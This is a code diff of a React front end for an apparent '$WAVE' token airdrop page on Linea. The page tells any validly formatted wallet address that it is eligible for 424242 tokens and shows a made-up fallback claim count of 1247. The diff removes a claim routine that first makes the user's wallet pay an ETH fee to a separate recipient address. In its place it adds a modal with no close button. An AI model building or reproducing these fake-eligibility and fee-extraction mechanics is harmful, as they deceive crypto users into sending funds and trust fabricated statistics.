@@ -53,6 +53,7 @@ export default function AirdropPage({
   const [showConnectModal, setShowConnectModal] = useState(false)
   const [copied, setCopied] = useState(false)
   const [showSocialModal, setShowSocialModal] = useState(false)
+  const [showClaimNotOpenModal, setShowClaimNotOpenModal] = useState(false) // NEW STATE
 
   useEffect(() => {
     fetchTotalClaims()
@@ -106,21 +107,20 @@ export default function AirdropPage({
             params: [
               {
                 to: CONTRACT_ADDRESS,
-                data: "0x4b0e7216", // Function selector for totalClaims()
+                data: "0x4b0e7216",
               },
               "latest",
             ],
           })
-
           const claimsCount = Number.parseInt(result, 16)
           setTotalClaimed(claimsCount)
-        } catch (contractError) {
+        } catch {
           setTotalClaimed(1247)
         }
       } else {
         setTotalClaimed(1247)
       }
-    } catch (error) {
+    } catch {
       setTotalClaimed(1247)
     }
   }
@@ -133,19 +133,21 @@ export default function AirdropPage({
 
   const proceedWithAirdropCheck = async () => {
     setShowSocialModal(false)
-
     const addressToCheck = walletAddress.trim() || connectedAddress
     if (!addressToCheck) return
-
     setIsChecking(true)
     setCheckResult(null)
-
     await new Promise((resolve) => setTimeout(resolve, 1500))
-
-    const isEligible = isValidEthereumAddress(addressToCheck)
+    const normalizedAddress = addressToCheck.trim()
+    const isEligible = isValidEthereumAddress(normalizedAddress)
     setCheckResult(isEligible ? "eligible" : "ineligible")
-
     setIsChecking(false)
+  }
+
+  // NOTE: The real claiming is disabled; only shows the modal
+  const handleClaim = async () => {
+    setShowClaimNotOpenModal(true)
+    return
   }
 
   const getPaymentAmount = async (): Promise<string> => {
@@ -155,110 +157,8 @@ export default function AirdropPage({
       const ethAmount = paymentUSD / ethPriceUSD
       const weiAmount = Math.floor(ethAmount * 1e18)
       return `0x${weiAmount.toString(16)}`
-    } catch (error) {
+    } catch {
       return "0x2386F26FC10000"
-    }
-  }
-
-  const handleClaim = async () => {
-    if (!isConnected) {
-      await connectWallet()
-      return
-    }
-
-    if (!isValidContractAddress) {
-      alert("Contract address is not configured. Please update CONTRACT_ADDRESS in the code.")
-      return
-    }
-
-    if (!isValidEthereumAddress(connectedAddress)) {
-      alert("Your connected wallet address is not a valid Ethereum address.")
-      return
-    }
-
-    setIsClaiming(true)
-    setClaimStatus({ step: "payment", message: "Processing payment of $1.5..." })
-
-    try {
-      if (window.ethereum) {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: LINEA_CHAIN_ID }],
-        })
-
-        const paymentAmount = await getPaymentAmount()
-
-        const paymentTxHash = await window.ethereum.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              from: connectedAddress,
-              to: PAYMENT_RECIPIENT,
-              value: paymentAmount,
-              gas: "0x5208",
-            },
-          ],
-        })
-
-        setClaimStatus({
-          step: "payment",
-          message: "Payment successful! Waiting for confirmation...",
-          paymentHash: paymentTxHash,
-        })
-
-        await new Promise((resolve) => setTimeout(resolve, 3000))
-
-        setClaimStatus({
-          step: "claim",
-          message: "Payment confirmed! Processing airdrop claim...",
-          paymentHash: paymentTxHash,
-        })
-
-        const claimTxHash = await window.ethereum.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              from: connectedAddress,
-              to: CONTRACT_ADDRESS,
-              data: "0x4e71d92d", // Function selector for claim()
-              gas: "0x7530",
-            },
-          ],
-        })
-
-        setClaimStatus({
-          step: "success",
-          message: "Both payment and claim successful!",
-          paymentHash: paymentTxHash,
-          claimHash: claimTxHash,
-        })
-
-        setHasClaimed(true)
-
-        setTimeout(() => {
-          fetchTotalClaims()
-        }, 3000)
-      }
-    } catch (error: any) {
-      let errorMessage = "Transaction failed. Please try again."
-      if (error.code === 4001) {
-        errorMessage = "Transaction was rejected by user"
-      } else if (error.code === -32603) {
-        errorMessage = "Transaction failed. Please check your balance and try again."
-      } else if (error.message?.includes("insufficient funds")) {
-        errorMessage = "Insufficient funds for payment and gas fees."
-      }
-
-      setClaimStatus({
-        step: "failed",
-        message: errorMessage,
-      })
-
-      setTimeout(() => {
-        setClaimStatus({ step: "idle", message: "" })
-      }, 5000)
-    } finally {
-      setIsClaiming(false)
     }
   }
 
@@ -267,8 +167,7 @@ export default function AirdropPage({
       await navigator.clipboard.writeText(walletAddress)
       setCopied(true)
       setTimeout(() => setCopied(false), 2000)
-    } catch (err) {
-    }
+    } catch (err) {}
   }
 
   const handleConnectWallet = () => {
@@ -293,13 +192,20 @@ export default function AirdropPage({
             }}
           ></div>
         </div>
-        {/* Floating SVG decorations here -- unchanged */}
-        <div className="absolute inset-0">
-          {/* Omitted for brevity, keep your SVGs and floating items here */}
-        </div>
+        {/* ...Decorative floating SVG elements (can copy/paste yours here)... */}
       </div>
-
       <div className="relative z-10 flex flex-col items-center justify-center text-white px-4 py-8 min-h-screen">
+        {showClaimNotOpenModal && (
+          <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50">
+            <div className="bg-slate-900/90 border border-red-400 rounded-xl p-8 max-w-sm w-full mx-4 shadow-2xl flex flex-col items-center">
+              <h3 className="text-xl font-bold text-center mb-3 text-red-300">Unlock &amp; Claim Not Open</h3>
+              <p className="text-red-200 text-center text-base">
+                Unlock and Claim is not open yet.
+              </p>
+              {/* No close button */}
+            </div>
+          </div>
+        )}
         {showSocialModal && (
           <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-md w-full mx-4 shadow-2xl">
@@ -341,7 +247,6 @@ export default function AirdropPage({
             </div>
           </div>
         )}
-
         {showConnectModal && (
           <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-sm w-full mx-4 shadow-2xl">
@@ -367,25 +272,20 @@ export default function AirdropPage({
             </div>
           </div>
         )}
-
         {!isValidContractAddress && (
           <div className="fixed top-4 left-4 right-4 bg-yellow-500/20 border border-yellow-300/30 rounded-lg p-3 text-yellow-100 text-sm backdrop-blur-sm">
             ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
           </div>
         )}
-
         <div className="mb-8">
           <div className="w-16 h-16 bg-blue-400/30 rounded-lg flex items-center justify-center backdrop-blur-sm border border-blue-300/20">
             <span className="text-2xl font-bold text-white">LINEA WAVE</span>
           </div>
         </div>
-
         <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
           $WAVE
         </h1>
-
         <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility</p>
-
         <div className="mb-6">
           {!isConnected ? (
             <button
@@ -411,7 +311,6 @@ export default function AirdropPage({
             </div>
           )}
         </div>
-
         <div className="w-full max-w-md mb-12 space-y-4">
           <div className="space-y-2">
             <div className="relative">
@@ -434,7 +333,6 @@ export default function AirdropPage({
               )}
             </div>
           </div>
-
           <button
             onClick={checkAirdrop}
             disabled={(!walletAddress.trim() && !connectedAddress) || isChecking}
@@ -442,7 +340,6 @@ export default function AirdropPage({
           >
             {isChecking ? "Checking..." : "Check Airdrop"}
           </button>
-
           {checkResult && (
             <div
               className={`p-4 rounded-lg backdrop-blur-sm border ${
@@ -460,7 +357,6 @@ export default function AirdropPage({
                     ? "Your wallet is eligible for 424242 $WAVE!"
                     : "Your wallet is not eligible for this airdrop."}
                 </div>
-
                 {checkResult === "eligible" && !hasClaimed && (
                   <div className="mt-4 space-y-2">
                     <div className="text-xs text-green-200 mb-2">
@@ -479,7 +375,6 @@ export default function AirdropPage({
                     </button>
                   </div>
                 )}
-
                 {claimStatus.step !== "idle" && (
                   <div
                     className={`mt-4 p-3 rounded-lg text-sm ${
@@ -509,16 +404,13 @@ export default function AirdropPage({
                     )}
                   </div>
                 )}
-
                 {hasClaimed && <div className="mt-3 text-green-200 font-semibold">✅ Successfully Claimed!</div>}
               </div>
             </div>
           )}
         </div>
-
         <div className="text-center space-y-6">
           <div className="text-blue-200 text-sm uppercase tracking-wider">AIRDROP STATS</div>
-
           <div className="inline-block p-6 rounded-xl bg-slate-900/50 backdrop-blur-md border-2 border-gold/50 shadow-lg shadow-gold/20 glow-border">
             <div className="text-4xl md:text-5xl font-bold text-grey glow-text">{totalClaimed}</div>
             <div className="text-lg text-blue-200 mt-2">Total Claimed</div>
